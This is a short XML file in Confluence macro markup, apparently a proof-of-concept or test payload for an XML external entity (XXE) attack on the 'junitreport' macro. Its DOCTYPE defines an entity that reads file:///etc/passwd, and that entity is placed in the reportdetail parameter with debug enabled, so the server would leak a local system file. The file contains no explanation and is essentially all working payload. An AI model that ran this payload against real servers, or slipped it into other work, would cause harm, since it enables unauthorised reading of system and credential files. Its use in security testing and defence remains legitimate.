<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE description [<!ELEMENT description ANY><!ENTITY asw SYSTEM "file:///etc/passwd">]>
<ac:structured-macro ac:name="junitreport">
  <ac:parameter ac:name="reportdetail">&asw;</ac:parameter>
  <ac:parameter ac:name="directory">
    <ri:url ri:value="http://confluence.com/download/attachments/123/"/>
  </ac:parameter>
  <ac:parameter ac:name="debug">true</ac:parameter>
  <ac:parameter ac:name="url">
    <ri:url ri:value="http://confluence.com/download/attachments/123/file.xml"/>
  </ac:parameter>
</ac:structured-macro>
